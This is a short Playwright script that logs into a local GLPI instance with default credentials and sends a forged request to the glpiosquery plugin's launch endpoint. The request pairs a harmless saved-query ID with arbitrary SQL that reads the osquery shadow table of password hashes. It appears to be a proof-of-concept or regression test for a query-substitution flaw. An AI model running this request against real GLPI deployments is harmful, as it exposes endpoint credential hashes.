// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Bijstaan
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch();
  const p = await b.newPage();
  await p.goto('http://localhost:8081/', {waitUntil:'networkidle'});
  await p.fill('#login_name','glpi'); await p.fill('input[type=password]','glpi');
  await p.click('button[type=submit]'); await p.waitForLoadState('networkidle');
  await p.goto('http://localhost:8081/plugins/glpiosquery/front/console.php', {waitUntil:'networkidle'});
  const res = await p.evaluate(async () => {
    const token = document.querySelector('meta[property="glpi:csrf_token"]').content;
    // Claim a harmless saved query while sending hostile SQL alongside it.
    const r = await fetch('/plugins/glpiosquery/ajax/launch.php', {
      method:'POST', credentials:'same-origin',
      headers:{'Content-Type':'application/json','X-Glpi-Csrf-Token':token,'X-Requested-With':'XMLHttpRequest'},
      body: JSON.stringify({saved_query_id: 5, sql: 'SELECT * FROM shadow', online_only:false})});
    return await r.json();
  });
  console.log('server executed:', JSON.stringify(res.sql));
  console.log('campaign id    :', res.campaign_id);
  await b.close();
})().catch(e=>{console.error(e.message);process.exit(1)});
